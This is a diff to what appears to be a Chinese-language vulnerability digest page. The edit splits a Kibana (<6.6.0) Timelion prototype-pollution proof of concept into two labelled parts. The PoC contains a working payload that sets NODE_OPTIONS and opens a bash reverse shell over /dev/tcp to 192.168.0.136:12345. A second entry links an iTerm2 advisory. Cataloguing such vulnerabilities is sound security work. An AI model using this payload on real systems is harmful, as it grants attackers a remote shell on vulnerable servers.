@@ -11,8 +11,8 @@ share: true
 ---
 1. **【20191017】Kibana < 6.6.0 控制台命令执行漏洞**
     - <https://mp.weixin.qq.com/s/R4rzYDp9-q2NYAOvPK951A>
-    - `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
-    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')`
+    - PoC Part1: `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')`
+    - PoC Part2: `.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')`
 
 1. **【20191010】iTerm2存在严重漏洞可导致远程命令执行**
     - <https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/>
